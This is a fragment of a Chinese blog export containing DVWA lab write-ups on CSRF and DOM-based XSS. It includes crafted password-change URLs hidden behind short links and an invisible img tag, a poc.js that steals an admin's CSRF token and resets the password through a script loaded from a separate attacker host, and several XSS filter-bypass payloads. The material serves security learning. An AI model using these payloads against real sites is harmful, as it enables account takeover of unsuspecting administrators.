autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_SERVER[<span class=\"string\">'HTTP_REFERER'</span>]:获取服务器主机</span><br><span class=\"line\">$_SERVER[<span class=\"string\">'HTTP_REFERER'</span>]：获取HTTP数据包中的referer参数的值,该参数表示访问到当前页面的前一页面。</span><br><span class=\"line\">eregi — 不区分大小写的正则表达式匹配</span><br><span class=\"line\">在referer中匹配服务器主机,以此来防御csrf</span><br></pre></td></tr></table></figure>\n\n<p>如果还按照low的做的话会发生错误。</p>\n<p><img src=\"/img/csrf/dvwa/medium_002.png\" alt=\"medium_002\"></p>\n<p>修改Referer值<code>http://192.168.1.119/192.168.1.110.html</code></p>\n<p><img src=\"/img/csrf/dvwa/medium_003.png\" alt=\"medium_003\"></p>\n<p>那么方法就出来了，在我服务器目录建一个<code>192.168.1.110.html</code>的文件不就好了。内容和hack.html一模一样。</p>\n<h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>将<code>http://192.168.1.119/192.168.1.110.html</code>用短链接构造后<code>http://suo.im/4Ejm74</code></p>\n<p><img src=\"/img/csrf/dvwa/medium_004.png\" alt=\"medium_004\"></p>\n<p><img src=\"/img/csrf/dvwa/medium_005.png\" alt=\"medium_005\"></p>\n<p>这个实验不算成功,发现了一个dvwa的问题，把cookie中的security改成了impossible,导致实验没法成功。去掉security=impossible再发送。</p>\n<p><img src=\"/img/csrf/dvwa/medium_006.png\" alt=\"medium_006\"></p>\n<p>后来发现这是一个dvwa有时会出现的bug,重启下服务有几率解决。</p>\n<p>查看数据库</p>\n<p><img src=\"/img/csrf/dvwa/medium_007.png\" alt=\"medium_007\"></p>\n<p>密码已经修改了。</p>\n<h2 id=\"High\"><a href=\"#High\" class=\"headerlink\" title=\"High\"></a>High</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/high_001.png\" alt=\"high_001\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里检查了tocken,tocken是包含在页面中的,所以要先获得管理员的<span class=\"built_in\">token</span>,这个<span class=\"built_in\">token</span>每次请求都会变化。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/csrf/dvwa/high_002.png\" alt=\"high_002\"></p>\n<p>像medium那样做会出现一个问题,如何获取token。</p>\n<p>本来想利用high级别的存储型xss来注入,但是绕过前端注入代码后发现下次访问依然会对长度限制。</p>\n<p>植入xss:</p>\n<p><code>&lt;iframe src=&#39;../csrf&#39; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code></p>\n<p><img src=\"/img/csrf/dvwa/high_003.png\" alt=\"hign_003\"></p>\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>利用DOM型。</p>\n<p>位于攻击者服务器的poc.js文件。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> theUrl = <span class=\"string\">'http://192.168.1.126/vulnerabilities/csrf/'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> pass = <span class=\"string\">'123456'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">    xmlhttp=<span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    xmlhttp=<span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"Microsoft.XMLHTTP\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.withCredentials = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> hacked = <span class=\"literal\">false</span>;</span><br><span class=\"line\">xmlhttp.onreadystatechange=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (xmlhttp.readyState==<span class=\"number\">4</span> &amp;&amp; xmlhttp.status==<span class=\"number\">200</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> text = xmlhttp.responseText;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> regex = <span class=\"regexp\">/user_token\\' value\\=\\'(.*?)\\' \\/\\&gt;/</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> match = text.match(regex);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> token = match[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> new_url = <span class=\"string\">'http://192.168.1.126/vulnerabilities/csrf/?user_token='</span>+token+<span class=\"string\">'&amp;password_new='</span>+pass+<span class=\"string\">'&amp;password_conf='</span>+pass+<span class=\"string\">'&amp;Change=Change'</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!hacked)&#123;</span><br><span class=\"line\">            alert(<span class=\"string\">'Got token:'</span> + match[<span class=\"number\">1</span>]);</span><br><span class=\"line\">            hacked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            xmlhttp.open(<span class=\"string\">\"GET\"</span>, new_url, <span class=\"literal\">false</span> );</span><br><span class=\"line\">            xmlhttp.send();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        count++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">xmlhttp.open(<span class=\"string\">\"GET\"</span>, theUrl, <span class=\"literal\">false</span> );</span><br><span class=\"line\">xmlhttp.send();</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/csrf/dvwa/high_004.png\" alt=\"high_004\"></p>\n<p><code>http://192.168.1.119/dvwa/vulnerabilities/xss_d/?default=English  #&lt;script src=&quot;http://192.168.1.125/poc.js&quot;&gt;&lt;/script&gt;</code></p>\n<p>诱骗管理员点击即可,当然可以像之前的一样包装一下。这里就不做了。</p>\n<h2 id=\"Impossible\"><a href=\"#Impossible\" class=\"headerlink\" title=\"Impossible\"></a>Impossible</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/im_001.png\" alt=\"im_001\"></p>\n<h3 id=\"Analysis-3\"><a href=\"#Analysis-3\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Impossible级别的代码利用PDO技术防御SQL注入，而CSRF不仅有<span class=\"built_in\">token</span>,还需要原密码，简单粗暴。</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"DVWA-CSRF手记\"><a href=\"#DVWA-CSRF手记\" class=\"headerlink\" title=\"DVWA-CSRF手记\"></a>DVWA-CSRF手记</h1><hr>\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/low_001.png\" alt=\"low_001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight qml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">没有进行任何过滤,只检验两次密码是否相同；检验用burpsuite抓包后可构造<span class=\"built_in\">url</span>,当受害者点击后会把密码修改。</span><br></pre></td></tr></table></figure>\n\n<p><code>http://192.168.1.110/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</code></p>\n<p>构造短网址</p>\n<p><img src=\"/img/csrf/dvwa/low_002.png\" alt=\"low_002\"></p>\n<p>诱骗管理员点击链接，需要管理员之前有登录过DVWA,(记得设置为low)并保留有session信息。</p>\n<p><img src=\"/img/csrf/dvwa/low_003.png\" alt=\"low_003\"></p>\n<p>密码修改成功。</p>\n<p><img src=\"/img/csrf/dvwa/low_004.png\" alt=\"low_004\"></p>\n<p>但是这样做过于明显,管理员又不是傻子。</p>\n<h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>通过img标签的src属性构造url。</p>\n<p><code>&lt;img src=&quot;http://suo.im/50R0sN&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</code></p>\n<p>将其藏入一个404的html页面中。</p>\n<p><img src=\"/img/csrf/dvwa/low_005.png\" alt=\"low_005\"></p>\n<p>将<code>http://192.168.1.119/hack.html</code>用短链接构造后<code>http://suo.im/4LOi71</code></p>\n<p><img src=\"/img/csrf/dvwa/low_006.png\" alt=\"low_006\"></p>\n<p><img src=\"/img/csrf/dvwa/low_007.png\" alt=\"low_007\"></p>\n<p>查看数据库</p>\n<p><img src=\"/img/csrf/dvwa/low_008.png\" alt=\"low_008\"></p>\n<p>密码已经被修改了。</p>\n<p><img src=\"/img/csrf/dvwa/low_009.png\" alt=\"low_009\"></p>\n<h2 id=\"Medium\"><a href=\"#Medium\" class=\"headerlink\" title=\"Medium\"></a>Medium</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/medumn_001.png\" alt=\"medium_001\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_SERVER[<span class=\"string\">'HTTP_REFERER'</span>]:获取服务器主机</span><br><span class=\"line\">$_SERVER[<span class=\"string\">'HTTP_REFERER'</span>]：获取HTTP数据包中的referer参数的值,该参数表示访问到当前页面的前一页面。</span><br><span class=\"line\">eregi — 不区分大小写的正则表达式匹配</span><br><span class=\"line\">在referer中匹配服务器主机,以此来防御csrf</span><br></pre></td></tr></table></figure>\n\n<p>如果还按照low的做的话会发生错误。</p>\n<p><img src=\"/img/csrf/dvwa/medium_002.png\" alt=\"medium_002\"></p>\n<p>修改Referer值<code>http://192.168.1.119/192.168.1.110.html</code></p>\n<p><img src=\"/img/csrf/dvwa/medium_003.png\" alt=\"medium_003\"></p>\n<p>那么方法就出来了，在我服务器目录建一个<code>192.168.1.110.html</code>的文件不就好了。内容和hack.html一模一样。</p>\n<h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>将<code>http://192.168.1.119/192.168.1.110.html</code>用短链接构造后<code>http://suo.im/4Ejm74</code></p>\n<p><img src=\"/img/csrf/dvwa/medium_004.png\" alt=\"medium_004\"></p>\n<p><img src=\"/img/csrf/dvwa/medium_005.png\" alt=\"medium_005\"></p>\n<p>这个实验不算成功,发现了一个dvwa的问题，把cookie中的security改成了impossible,导致实验没法成功。去掉security=impossible再发送。</p>\n<p><img src=\"/img/csrf/dvwa/medium_006.png\" alt=\"medium_006\"></p>\n<p>后来发现这是一个dvwa有时会出现的bug,重启下服务有几率解决。</p>\n<p>查看数据库</p>\n<p><img src=\"/img/csrf/dvwa/medium_007.png\" alt=\"medium_007\"></p>\n<p>密码已经修改了。</p>\n<h2 id=\"High\"><a href=\"#High\" class=\"headerlink\" title=\"High\"></a>High</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/high_001.png\" alt=\"high_001\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里检查了tocken,tocken是包含在页面中的,所以要先获得管理员的<span class=\"built_in\">token</span>,这个<span class=\"built_in\">token</span>每次请求都会变化。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/csrf/dvwa/high_002.png\" alt=\"high_002\"></p>\n<p>像medium那样做会出现一个问题,如何获取token。</p>\n<p>本来想利用high级别的存储型xss来注入,但是绕过前端注入代码后发现下次访问依然会对长度限制。</p>\n<p>植入xss:</p>\n<p><code>&lt;iframe src=&#39;../csrf&#39; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code></p>\n<p><img src=\"/img/csrf/dvwa/high_003.png\" alt=\"hign_003\"></p>\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>利用DOM型。</p>\n<p>位于攻击者服务器的poc.js文件。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> theUrl = <span class=\"string\">'http://192.168.1.126/vulnerabilities/csrf/'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> pass = <span class=\"string\">'123456'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">    xmlhttp=<span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    xmlhttp=<span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"Microsoft.XMLHTTP\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.withCredentials = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> hacked = <span class=\"literal\">false</span>;</span><br><span class=\"line\">xmlhttp.onreadystatechange=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (xmlhttp.readyState==<span class=\"number\">4</span> &amp;&amp; xmlhttp.status==<span class=\"number\">200</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> text = xmlhttp.responseText;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> regex = <span class=\"regexp\">/user_token\\' value\\=\\'(.*?)\\' \\/\\&gt;/</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> match = text.match(regex);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> token = match[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">var</span> new_url = <span class=\"string\">'http://192.168.1.126/vulnerabilities/csrf/?user_token='</span>+token+<span class=\"string\">'&amp;password_new='</span>+pass+<span class=\"string\">'&amp;password_conf='</span>+pass+<span class=\"string\">'&amp;Change=Change'</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!hacked)&#123;</span><br><span class=\"line\">            alert(<span class=\"string\">'Got token:'</span> + match[<span class=\"number\">1</span>]);</span><br><span class=\"line\">            hacked = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            xmlhttp.open(<span class=\"string\">\"GET\"</span>, new_url, <span class=\"literal\">false</span> );</span><br><span class=\"line\">            xmlhttp.send();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        count++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">xmlhttp.open(<span class=\"string\">\"GET\"</span>, theUrl, <span class=\"literal\">false</span> );</span><br><span class=\"line\">xmlhttp.send();</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/csrf/dvwa/high_004.png\" alt=\"high_004\"></p>\n<p><code>http://192.168.1.119/dvwa/vulnerabilities/xss_d/?default=English  #&lt;script src=&quot;http://192.168.1.125/poc.js&quot;&gt;&lt;/script&gt;</code></p>\n<p>诱骗管理员点击即可,当然可以像之前的一样包装一下。这里就不做了。</p>\n<h2 id=\"Impossible\"><a href=\"#Impossible\" class=\"headerlink\" title=\"Impossible\"></a>Impossible</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/im_001.png\" alt=\"im_001\"></p>\n<h3 id=\"Analysis-3\"><a href=\"#Analysis-3\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Impossible级别的代码利用PDO技术防御SQL注入，而CSRF不仅有<span class=\"built_in\">token</span>,还需要原密码，简单粗暴。</span><br></pre></td></tr></table></figure>\n\n"},{"title":"DVWA-XSS‘DOM型’手记","date":"2018-10-10T13:29:38.000Z","_content":"\n# DVWA-XSS‘DOM型’手记\n\n------\n\n可能触发DOM型XSS的属性：\n\n```\ndocument.referer属性\n \nwindow.name属性\n \nlocation属性\n \ninnerHTML属性\n \ndocumen.write属性\n```\n\n\n\n## LOW\n\n### Source:\n\n![001](/img/xss/dvwa/Dom/low_001.png)\n\n### Analysis:\t\n\n```\n没有进行任何过滤,利用F12开发者模式寻找到DOM位置。找到name属性为default,通过在url中的default参数来修改页面。\n```\n\n![002](/img/xss/dvwa/Dom/low_002.png)\n\n这里可以直接弹窗。\n\n```\n1.http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>\n```\n\n![003](/img/xss/dvwa/Dom/low_003.png)\n\n可以发现结构已经被破坏了。\n\n![004](/img/xss/dvwa/Dom/low_004.png)\n\n同样可以构造闭合将页面破坏成想要的样子。\n\n2.`http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name=\"fuck\">`\n\n### Process:\n\n![005](/img/xss/dvwa/Dom/low_005.png)\n\n![006](/img/xss/dvwa/Dom/low_006.png)\n\n## MEDIUM\n\n### Source:\n\n![007](/img/xss/dvwa/Dom/medium_001.png)\n\n### Analysis:\t\n\n```\n查找是否存在<script,stripos能检验大小写的,发现恶意构造的就默认使用English。\n既然这样就不使用<script即可。\n```\n\n\n    1. 使用事件\n      `http://10.60.250.250/DVWA/vulnerabilities/xss_d/?default=</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name=\"fuck\">`\n    2. 使用javascript协议\n     `http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=</select><a href=\"javascript:alert('javascript')\">Clickme</a><select name=\"fuck\">`\n\n### Process:\n\n1. 使用事件\n\n![008](/img/xss/dvwa/Dom/medium_002.png)\n\n2. 使用javascript协议\n\n   ![009](/img/xss/dvwa/Dom/medium_003.png)\n\n![010](/img/xss/dvwa/Dom/medium_004.png)\n\n## HIGH\n\n### Source:\n\n![011](/img/xss/dvwa/Dom/high_001.png)\n\n### Analysis:\t\n\n```\n类似于白名单过滤,看似无懈可击,但是可以利用URL的一个特性。\nURL的部分发往服务器时#号后面的并不会发送到服务器，但是javascript代码\n还会正常读取，所以利用这个特性来绕过服务器端的检查。\n```\n\n1.`http://192.168.1.111/DVWA/vulnerabilities/xss_d/?default=#</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name=\"fuck\">`\n\n### Process:\n\n![012](/img/xss/dvwa/Dom/high_002.png)\n\n![013](/img/xss/dvwa/Dom/high_003.png)\n\n## IMPOSSIBLE\n\n### Source:\n\n![014](/img/xss/dvwa/Dom/impossible_01.png)\n\n提示已经用客户端侧进行保护了,无法再进行修改。","source":"_posts/DVWA-XSS‘DOM型’手记.md","raw":"---\ntitle: DVWA-XSS‘DOM型’手记\ndate: 2018-10-10 21:29:38\ntags: [DVWA,XSS]\ncategories: XSS\n---\n\n# DVWA-XSS‘DOM型’手记\n\n------\n\n可能触发DOM型XSS的属性：\n\n```\ndocument.referer属性\n \nwindow.name属性\n \nlocation属性\n \ninnerHTML属性\n \ndocumen.write属性\n```\n\n\n\n## LOW\n\n### Source:\n\n![001](/img/xss/dvwa/Dom/low_001.png)\n\n### Analysis:\t\n\n```\n没有进行任何过滤,利用F12开发者模式寻找到DOM位置。找到name属性为default,通过在url中的default参数来修改页面。\n```\n\n![002](/img/xss/dvwa/Dom/low_002.png)\n\n这里可以直接弹窗。\n\n```\n1.http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>\n```\n\n![003](/img/xss/dvwa/Dom/low_003.png)\n\n可以发现结构已经被破坏了。\n\n![004](/img/xss/dvwa/Dom/low_004.png)\n\n同样可以构造闭合将页面破坏成想要的样子。\n\n2.`http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name=\"fuck\">`\n\n### Process:\n\n![005](/img/xss/dvwa/Dom/low_005.png)\n\n![006](/img/xss/dvwa/Dom/low_006.png)\n\n## MEDIUM\n\n### Source:\n\n![007](/img/xss/dvwa/Dom/medium_001.png)\n\n### Analysis:\t\n\n```\n查找是否存在<script,stripos能检验大小写的,发现恶意构造的就默认使用English。\n既然这样就不使用<script即可。\n```\n\n\n    1. 使用事件\n      `http://10.60.250.250/DVWA/vulnerabilities/xss_d/?default=</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name=\"fuck\">`\n    2. 使用javascript协议\n     `http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=</select><a href=\"javascript:alert('javascript')\">Clickme</a><select name=\"fuck\">`\n\n### Process:\n\n1. 使用事件\n\n![008](/img/xss/dvwa/Dom/medium_002.png)\n\n2. 使用javascript协议\n\n   ![009](/img/xss/dvwa/Dom/medium_003.png)\n\n![010](/img/xss/dvwa/Dom/medium_004.png)\n\n## HIGH\n\n### Source:\n\n![011](/img/xss/dvwa/Dom/high_001.png)\n\n### Analysis:\t\n\n```\n类似于白名单过滤,看似无懈可击,但是可以利用URL的一个特性。\nURL的部分发往服务器时#号后面的并不会发送到服务器，但是javascript代码\n还会正常读取，所以利用这个特性来绕过服务器端的检查。\n```\n\n1.`http://192.168.1.111/DVWA/vulnerabilities/xss_d/?default=#</select><a href=# onmouseover=alert('事件')>ClickHere</a><select name=\"fuck\">`\n\n### Process:\n\n![012](/img/xss/dvwa/Dom/high_002.png)\n\n![013](/img/xss/dvwa/Dom/high_003.png)\n\n## IMPOSSIBLE\n\n### Source:\n\n![014](/img/xss/dvwa/Dom/impossible_01.png)\n\n提示已经用客户端侧进行保护了,无法再进行修改。","slug":"DVWA-XSS‘DOM型’手记","published":1,"updated":"2019-06-19T17:23:13.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istbg00084dsbkk3vg84k","content":"<h1 id=\"DVWA-XSS‘DOM型’手记\"><a href=\"#DVWA-XSS‘DOM型’手记\" class=\"headerlink\" title=\"DVWA-XSS‘DOM型’手记\"></a>DVWA-XSS‘DOM型’手记</h1><hr>\n<p>可能触发DOM型XSS的属性：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">document</span><span class=\"selector-class\">.referer</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">window</span><span class=\"selector-class\">.name</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">location</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">innerHTML</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">documen</span><span class=\"selector-class\">.write</span>属性</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/low_001.png\" alt=\"001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">没有进行任何过滤,利用F12开发者模式寻找到DOM位置。找到<span class=\"keyword\">name</span>属性为<span class=\"keyword\">default</span>,通过在url中的<span class=\"keyword\">default</span>参数来修改页面。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/dvwa/Dom/low_002.png\" alt=\"002\"></p>\n<p>这里可以直接弹窗。</p>\n<figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.http://<span class=\"number\">10.60</span>.<span class=\"number\">250.3</span>/dvwa/vulnerabilities/xss_d/?<span class=\"keyword\">default</span>=<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/dvwa/Dom/low_003.png\" alt=\"003\"></p>\n<p>可以发现结构已经被破坏了。</p>\n<p><img src=\"/img/xss/dvwa/Dom/low_004.png\" alt=\"004\"></p>\n<p>同样可以构造闭合将页面破坏成想要的样子。</p>\n<p>2.<code>http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=&lt;/select&gt;&lt;a href=# onmouseover=alert(&#39;事件&#39;)&gt;ClickHere&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;</code></p>\n<h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Dom/low_005.png\" alt=\"005\"></p>\n<p><img src=\"/img/xss/dvwa/Dom/low_006.png\" alt=\"006\"></p>\n<h2 id=\"MEDIUM\"><a href=\"#MEDIUM\" class=\"headerlink\" title=\"MEDIUM\"></a>MEDIUM</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/medium_001.png\" alt=\"007\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找是否存在&lt;<span class=\"keyword\">script</span>,stripos能检验大小写的,发现恶意构造的就默认使用English。</span><br><span class=\"line\">既然这样就不使用&lt;<span class=\"keyword\">script</span>即可。</span><br></pre></td></tr></table></figure>\n\n<pre><code>1. 使用事件\n  `http://10.60.250.250/DVWA/vulnerabilities/xss_d/?default=&lt;/select&gt;&lt;a href=# onmouseover=alert(&apos;事件&apos;)&gt;ClickHere&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;`\n2. 使用javascript协议\n `http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=&lt;/select&gt;&lt;a href=&quot;javascript:alert(&apos;javascript&apos;)&quot;&gt;Clickme&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;`</code></pre><h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><ol>\n<li>使用事件</li>\n</ol>\n<p><img 